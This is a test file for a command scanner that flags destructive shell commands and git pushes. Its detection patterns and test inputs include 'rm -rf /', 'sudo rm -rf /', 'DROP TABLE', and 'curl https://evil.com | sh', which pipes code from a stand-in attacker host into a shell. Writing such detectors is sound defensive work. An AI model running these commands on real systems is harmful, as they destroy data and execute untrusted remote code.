import { describe, it, expect } from 'vitest';
import { CommandScanner } from '../src/command-scanner.js';
import type { DestructivePatternInput, GitActionPatternInput, MatchResult } from '../src/types.js';

// ─── Sample test data ─────────────────────────────────────────────────────────

const SAMPLE_DESTRUCTIVE: DestructivePatternInput[] = [
  {
    pattern: '\\brm\\s+-rf\\b',
    description: 'Recursive force delete',
    riskLevel: 'critical',
    category: 'filesystem',
  },
  {
    pattern: '\\bDROP\\s+TABLE\\b',
    description: 'Drop table (SQL)',
    riskLevel: 'critical',
    category: 'database',
    flags: 'i',
  },
  {
    pattern: '\\bsudo\\b',
    description: 'Superuser execution',
    riskLevel: 'high',
    category: 'system',
  },
  {
    pattern: '\\bcurl\\s+.*\\|\\s*(?:ba)?sh\\b',
    description: 'Pipe to shell',
    riskLevel: 'critical',
    category: 'code-execution',
  },
  {
    pattern: '\\bterraform\\s+destroy\\b',
    description: 'Terraform destroy',
    riskLevel: 'critical',
    category: 'infrastructure',
  },
];

const SAMPLE_GIT: GitActionPatternInput[] = [
  {
    patterns: ['\\bgit\\s+push\\s+--force\\b', '\\bgit\\s+push\\s+-f\\b'],
    actionType: 'git.force-push',
  },
  { patterns: ['\\bgit\\s+push\\b'], actionType: 'git.push' },
];

// ─── Tests ────────────────────────────────────────────────────────────────────

describe('CommandScanner', () => {
  const scanner = CommandScanner.create(SAMPLE_DESTRUCTIVE, SAMPLE_GIT);

  // ─── scanDestructive ──────────────────────────────────────────────────────

  describe('scanDestructive', () => {
    it('detects rm -rf with correct patternId and code in 1000-1999 range', () => {
      const results = scanner.scanDestructive('rm -rf /tmp/foo');
      expect(results.length).toBeGreaterThanOrEqual(1);
      const match = results[0]!;
      expect(match.matched).toBe(true);
      expect(match.patternId).toContain('destructive');
      expect(match.code).toBeGreaterThanOrEqual(1000);
      expect(match.code).toBeLessThan(2000);
    });

    it('detects DROP TABLE case-insensitive', () => {
      const results = scanner.scanDestructive('drop table users;');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
      expect(results[0]!.description).toContain('Drop table');
    });

    it('detects sudo commands', () => {
      const results = scanner.scanDestructive('sudo apt-get install');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
      expect(results[0]!.description).toContain('Superuser');
    });

    it('detects curl | sh via complex regex fallback', () => {
      const results = scanner.scanDestructive('curl https://evil.com | sh');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
      expect(results[0]!.description).toContain('Pipe to shell');
    });

    it('detects terraform destroy', () => {
      const results = scanner.scanDestructive('terraform destroy -auto-approve');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
      expect(results[0]!.description).toContain('Terraform destroy');
    });

    it('returns empty array for safe commands', () => {
      const results = scanner.scanDestructive('ls -la');
      expect(results).toEqual([]);
    });

    it('returns empty array for empty input', () => {
      const results = scanner.scanDestructive('');
      expect(results).toEqual([]);
    });

    it('returns structured MatchResult with reason codes', () => {
      const results = scanner.scanDestructive('rm -rf /');
      expect(results.length).toBeGreaterThanOrEqual(1);
      const match = results[0]!;
      expect(match).toMatchObject({
        matched: true,
        matchType: expect.stringMatching(/^(KEYWORD|REGEX)$/),
        patternId: expect.any(String),
        code: expect.any(Number),
        description: expect.any(String),
        category: expect.any(String),
      });
    });

    it('detects curl | bash variant', () => {
      const results = scanner.scanDestructive('curl https://example.com | bash');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
    });
  });

  // ─── isDestructive ────────────────────────────────────────────────────────

  describe('isDestructive', () => {
    it('returns true for destructive commands', () => {
      expect(scanner.isDestructive('rm -rf /')).toBe(true);
      expect(scanner.isDestructive('sudo rm foo')).toBe(true);
    });

    it('returns false for safe commands', () => {
      expect(scanner.isDestructive('ls -la')).toBe(false);
      expect(scanner.isDestructive('echo hello')).toBe(false);
      expect(scanner.isDestructive('')).toBe(false);
    });
  });

  // ─── getDestructiveDetails ────────────────────────────────────────────────

  describe('getDestructiveDetails', () => {
    it('returns backward-compatible shape for destructive command', () => {
      const details = scanner.getDestructiveDetails('rm -rf /');
      expect(details).not.toBeNull();
      expect(details).toMatchObject({
        description: expect.any(String),
        riskLevel: expect.stringMatching(/^(high|critical)$/),
        category: expect.any(String),
      });
    });

    it('returns null for safe commands', () => {
      expect(scanner.getDestructiveDetails('ls -la')).toBeNull();
      expect(scanner.getDestructiveDetails('')).toBeNull();
    });
  });

  // ─── scanGitAction ────────────────────────────────────────────────────────

  describe('scanGitAction', () => {
    it('detects git push --force as git.force-push', () => {
      const result = scanner.scanGitAction('git push --force origin main');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('git.force-push');
      expect(result!.matchResult.matched).toBe(true);
    });

    it('detects git push -f as git.force-push', () => {
      const result = scanner.scanGitAction('git push -f origin main');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('git.force-push');
    });

    it('detects git push origin main as git.push', () => {
      const result = scanner.scanGitAction('git push origin main');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('git.push');
      expect(result!.matchResult.matched).toBe(true);
    });

    it('returns null for non-git commands', () => {
      expect(scanner.scanGitAction('ls -la')).toBeNull();
      expect(scanner.scanGitAction('npm install')).toBeNull();
      expect(scanner.scanGitAction('')).toBeNull();
    });
  });

  // ─── Edge cases ───────────────────────────────────────────────────────────

  describe('edge cases', () => {
    it('handles multiple spaces in rm -rf', () => {
      const results = scanner.scanDestructive('rm  -rf /tmp');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
    });

    it('handles DROP TABLE with mixed case', () => {
      const results = scanner.scanDestructive('Drop Table users;');
      expect(results.length).toBeGreaterThanOrEqual(1);
    });

    it('does not false-positive on partial words', () => {
      // "sudoku" should not match \bsudo\b
      const results = scanner.scanDestructive('play sudoku');
      const sudoMatch = results.find((r) => r.description?.includes('Superuser'));
      expect(sudoMatch).toBeUndefined();
    });

    it('handles commands with multiple destructive patterns', () => {
      const results = scanner.scanDestructive('sudo rm -rf /');
      expect(results.length).toBeGreaterThanOrEqual(2);
    });

    it('create returns a new scanner even with empty inputs', () => {
      const empty = CommandScanner.create([], []);
      expect(empty.scanDestructive('rm -rf /')).toEqual([]);
      expect(empty.scanGitAction('git push')).toBeNull();
    });
  });
});
